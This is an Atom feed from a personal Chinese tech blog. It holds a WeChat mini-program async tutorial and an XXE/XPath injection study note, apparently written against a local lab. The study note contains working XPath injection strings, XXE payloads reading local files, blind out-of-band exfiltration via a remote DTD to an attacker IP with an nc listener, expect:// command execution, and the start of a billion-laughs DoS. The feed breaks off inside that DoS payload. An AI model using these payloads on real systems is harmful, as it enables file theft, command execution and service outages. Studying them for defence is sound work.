<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Extrader的小站</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.extrader.top/"/>
  <updated>2020-08-13T12:55:31.000Z</updated>
  <id>https://www.extrader.top/</id>
  
  <author>
    <name>Extrader</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>微信小程序有关异步问题的一些操作</title>
    <link href="https://www.extrader.top/posts/80b70afe/"/>
    <id>https://www.extrader.top/posts/80b70afe/</id>
    <published>2020-08-13T12:55:31.000Z</published>
    <updated>2020-08-13T12:55:31.000Z</updated>
    
    <content type="html"><![CDATA[<p>方法不唯一，后续有新方法再补上~</p><a id="more"></a><h3 id="Promise-对象"><a href="#Promise-对象" class="headerlink" title="Promise 对象"></a>Promise 对象</h3><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> promise <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token comment">/* 异步操作成功 */</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">resolve</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">reject</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>promise<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// success</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// failure</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>关于<code>promise</code>  具体可参考阮老师的<a href="https://es6.ruanyifeng.com/#docs/promise">Promise 对象</a></p><p>或者直接</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">try</span><span class="token punctuation">&#123;</span>    xxx  <span class="token punctuation">&#125;</span>  <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="同步化异步函数"><a href="#同步化异步函数" class="headerlink" title="同步化异步函数"></a>同步化异步函数</h3><p>app.js</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//app.js</span><span class="token keyword">function</span> <span class="token function">promisify</span><span class="token punctuation">(</span><span class="token parameter">api</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token parameter">opt<span class="token punctuation">,</span> <span class="token operator">...</span>arg</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token function">api</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> opt<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> success<span class="token operator">:</span> resolve<span class="token punctuation">,</span> fail<span class="token operator">:</span> reject <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">...</span>arg<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  request<span class="token operator">:</span> <span class="token function">promisify</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>request<span class="token punctuation">)</span><span class="token punctuation">,</span>  getUserInfo<span class="token operator">:</span> <span class="token function">promisify</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>getUserInfo<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function-variable function">onLaunch</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    xxx  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  globalData<span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p>index.js使用</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> app <span class="token operator">=</span> <span class="token function">getApp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">Page</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token function-variable function">showdate</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token keyword">await</span> app<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>url<span class="token operator">:</span><span class="token string">'xxx'</span><span class="token punctuation">,</span><span class="token punctuation">,</span>method<span class="token operator">:</span><span class="token string">'POST'</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">&#123;</span>x<span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span>y<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p><code>Object.assign()</code> 方法用于将所有可枚举属性的值从一个或多个源对象复制到目标对象。它将返回目标对象。</p><h3 id="wx-request请求封装"><a href="#wx-request请求封装" class="headerlink" title="wx.request请求封装"></a>wx.request请求封装</h3><h4 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h4><p><code>api/index.js</code>封装</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">getdata</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> data<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  wx<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      url<span class="token operator">:</span> url<span class="token punctuation">,</span>      data<span class="token operator">:</span> data<span class="token punctuation">,</span>      method<span class="token operator">:</span> <span class="token string">'GET'</span><span class="token punctuation">,</span>      header<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/json'</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">typeof</span> callback <span class="token operator">==</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>data<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function-variable function">fail</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">typeof</span> callback <span class="token operator">==</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> <span class="token function-variable function">postdata</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> data<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  wx<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      url<span class="token operator">:</span> url<span class="token punctuation">,</span>      data<span class="token operator">:</span> data<span class="token punctuation">,</span>      method<span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>      header<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/x-www-form-urlencoded'</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">typeof</span> callback <span class="token operator">==</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>data<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function-variable function">fail</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">typeof</span> callback <span class="token operator">==</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  getdata<span class="token punctuation">,</span>  postdata<span class="token punctuation">&#125;</span></code></pre><p><code>app.js</code>引入</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> api <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span>'<span class="token punctuation">.</span><span class="token operator">/</span>api<span class="token operator">/</span>index<span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token function-variable function">onLaunch</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    xxx  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  globalData<span class="token operator">:</span> <span class="token punctuation">&#123;</span>    api  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p><code>index.js</code>使用</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">getApp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> api <span class="token operator">=</span> app<span class="token punctuation">.</span>globalData<span class="token punctuation">.</span>api<span class="token function">Page</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  api<span class="token punctuation">.</span><span class="token function">getdata</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  api<span class="token punctuation">.</span><span class="token function">postdata</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>x<span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span>y<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><h4 id="同步"><a href="#同步" class="headerlink" title="同步"></a>同步</h4><p><code>app.js</code>引入</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">promisify</span><span class="token punctuation">(</span><span class="token parameter">api</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token parameter">opt<span class="token punctuation">,</span> <span class="token operator">...</span>arg</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token function">api</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> opt<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> success<span class="token operator">:</span> resolve<span class="token punctuation">,</span> fail<span class="token operator">:</span> reject <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">...</span>arg<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  request<span class="token operator">:</span> <span class="token function">promisify</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>request<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p><code>index.js</code>使用</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">getApp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">Page</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token function-variable function">showdate</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token keyword">await</span> app<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>url<span class="token operator">:</span><span class="token string">'xxx'</span><span class="token punctuation">,</span>method<span class="token operator">:</span><span class="token string">'GET'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://es6.ruanyifeng.com/#docs/promise">Promise 对象</a></li><li><a href="https://blog.csdn.net/weixin_44833680/article/details/102658108">微信小程序封装异步请求</a></li><li><a href="https://developers.weixin.qq.com/community/develop/article/doc/00028cbc2e04e0ddf549d535351c13">将小程序原生异步函数promisify后，在async/await中使用</a></li><li><a href="https://developers.weixin.qq.com/community/develop/article/doc/000ceaee71c9d09ae5b8c77d151813">微信小程序中使用Async/Await方法异步请求变为同步请求</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;方法不唯一，后续有新方法再补上~&lt;/p&gt;
    
    </summary>
    
    
      <category term="开发" scheme="https://www.extrader.top/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="JavaScript" scheme="https://www.extrader.top/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>XXE学习笔记</title>
    <link href="https://www.extrader.top/posts/55c267c8/"/>
    <id>https://www.extrader.top/posts/55c267c8/</id>
    <published>2020-08-11T02:06:34.000Z</published>
    <updated>2020-08-11T02:06:34.000Z</updated>
    
    <content type="html"><![CDATA[    <div id="aplayer-yDPOJgUX" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="5174564734" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="none" data-theme="#ad7a86"></div><a id="more"></a><h3 id="XPath注入"><a href="#XPath注入" class="headerlink" title="XPath注入"></a>XPath注入</h3><p>XPath注入对象是一个存储数据的XML文件</p><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p><strong>index.xml</strong></p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>users</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>rootpwd<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>adminpwd<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>users</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p><strong>index.php</strong></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$xml&#x3D;simplexml_load_file(&#39;index.xml&#39;);$name&#x3D;$_GET[&#39;name&#39;];$pwd&#x3D;$_GET[&#39;pwd&#39;];$query&#x3D;&quot;&#x2F;root&#x2F;users&#x2F;user[username&#x2F;text()&#x3D;&#39;&quot;.$name.&quot;&#39; and password&#x2F;text()&#x3D;&#39;&quot;.$pwd.&quot;&#39;]&quot;;echo $query;$result&#x3D;$xml-&gt;xpath($query);if($result)&#123;    echo &#39;&lt;h2&gt;Welcome&lt;&#x2F;h2&gt;&#39;;    foreach($result as $key&#x3D;&gt;$value)&#123;        echo &#39;&lt;br &#x2F;&gt;ID:&#39;.$value-&gt;id;        echo &#39;&lt;br &#x2F;&gt;Username:&#39;.$value-&gt;username;    &#125;&#125;?&gt;</code></pre><h4 id="直接注入"><a href="#直接注入" class="headerlink" title="直接注入"></a>直接注入</h4><p><strong>payload</strong></p><p><code>?name=&#39; or 1=1 or &#39;&#39;=&#39;&amp;pwd=1</code>，结果如下，类似sql注入，绕过了xml查询</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811093843233.png" alt loading="lazy"></p><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p><strong>payload</strong></p><p>有返回结果则为正确</p><pre class="language-xml" data-language="xml"><code class="language-xml">推测根节点数，有返回结果则说明只有一个根节点' or count(/*) = 1 or '1' = '2  猜解一级节点' or substring(name(/*[position() = 1]),1,1)='r' or '1'='2  ' or substring(name(/*[position() = 1]),1,1)='o' or '1'='2  ......推测root的下一级节点数' or count(/root/*) = 1 or '1' = '2猜解root的下一级节点' or substring(name(/root/*[position() = 1]),1,1)='u' or '1'='2' or substring(name(/root/*[position() = 1]),1,1)='s' or '1'='2......猜解节点中的数据' or /root/users/user[1]/username[contains(text(),'r')] or '1'='2  ' or /root/users/user[1]/username[contains(text(),'ro')] or '1'='2  ......</code></pre><ul><li><code>/ ：</code>从根节点选取</li><li><code>// ：</code>从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置</li><li><code>. ：</code>选取当前节点</li><li><code>.. ：</code>选取当前节点的父节点</li></ul><h3 id="XML外部实体注入-XXE"><a href="#XML外部实体注入-XXE" class="headerlink" title="XML外部实体注入(XXE)"></a>XML外部实体注入(XXE)</h3><blockquote><p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成<strong>任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击</strong>等危害。</p><p>XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p></blockquote><blockquote><p>XXE的造成与PHP版本无关，与libxml库的版本有关。libxml &lt;= 2.9.0中，默认启用了外部实体，libxml&gt;2.9.0中默认仅用了外部实体。XXE并不是直接由libxml库造成的，libxml库提供了一些XML核心功能，包括禁用外部实体的libxml_disable_entity_loader()函数，SimpleXML库提供了解析XML的函数，SimpleXML库依赖于libxml库。</p></blockquote><p>本地测试环境php.4.45   libxml = 2.7.8</p><p>外部实体可支持http、file等协议。不同程序支持的协议不同</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811110816675.png" alt loading="lazy"></p><h4 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a>读取任意文件</h4><h5 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h5><p><strong>xxe.php</strong></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$xml &#x3D; simplexml_load_string($_REQUEST[&#39;xml&#39;]);print_r($xml);?&gt;</code></pre><p><strong>payload</strong></p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY >&lt;!ENTITY file SYSTEM "file:///d://flag.txt" >]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>url编码后给传入，即在 xml 中 <code>&amp;file ;</code> 变成了外部文件<code>qwzf.txt</code>中内容，导致敏感信息泄露。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811102323743.png" alt loading="lazy"></p><h5 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h5><p><strong>xxe.php</strong></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$xml &#x3D; simplexml_load_string($_REQUEST[&#39;xml&#39;]);&#x2F;&#x2F; print_r($xml);?&gt;</code></pre><p>这种情况就需要将数据发送到远程服务器(攻击服务器)</p><p><strong>payload</strong></p><p><strong>传入的xml</strong>    两种方式</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token doctype">&lt;!DOCTYPE test[&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=D:/flag.txt">&lt;!ENTITY % dtd SYSTEM "http://172.18.104.218/xxe.dtd">%dtd;%send;]></span>另一种方式<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token doctype">&lt;!DOCTYPE root[    &lt;!ENTITY % dtd SYSTEM "http://172.18.104.218/xxe.dtd">    %dtd;]></span></code></pre><p><strong>远程服务器的xxe.dtd文件</strong>    两种方式</p><pre class="language-xml" data-language="xml"><code class="language-xml">&lt;!ENTITY % payload "&lt;!ENTITY <span class="token entity" title="&#37;">&amp;#37;</span> send SYSTEM 'http://172.18.104.218/?content=%file;'>">%payload;另一种方式：&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=D:/flag.txt">&lt;!ENTITY % int "&lt;!ENTITY <span class="token entity" title="&#37;">&amp;#37;</span> send SYSTEM 'http://172.18.104.218:5000/?content=%file;'>">%int;%send;</code></pre><p>将xml进行url编码后传入</p><p>再查看远程服务器的apache日志文件</p><p><code>cat /var/log/apache2/access.log</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811104737190.png" alt loading="lazy"></p><p><code>nc -lvp 5000</code>  端口监听</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811111337248.png" alt loading="lazy"></p><p>解码后即是文件的内容</p><p>攻击流程</p><ul><li>先调用<code>%dtd</code>，请求远程服务器(攻击服务器)上的<code>evil.dtd</code>。</li><li>再调用 <code>evil.dtd</code>中的 <code>%file</code>。<code>%file</code> 获取受攻击的服务器上面的敏感文件，然后将 <code>%file</code> 的返回结果传到<code>%send</code> 。</li><li>然后调用 <code>%send;</code> 把读取到的数据发送到远程服务器上。</li></ul><h4 id="系统命令执行"><a href="#系统命令执行" class="headerlink" title="系统命令执行"></a>系统命令执行</h4><p>在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY >&lt;!ENTITY xxe SYSTEM "expect://id" >]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>通过XXE可以实现RCE的实例很少。</p><h4 id="拒绝服务攻击-Dos"><a href="#拒绝服务攻击-Dos" class="headerlink" title="拒绝服务攻击(Dos)"></a>拒绝服务攻击(Dos)</h4><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>   <span class="token doctype">&lt;!DOCTYPE lolz [&lt;!ENTITY lol "lol">&lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;">&lt;!ENTITY lol3 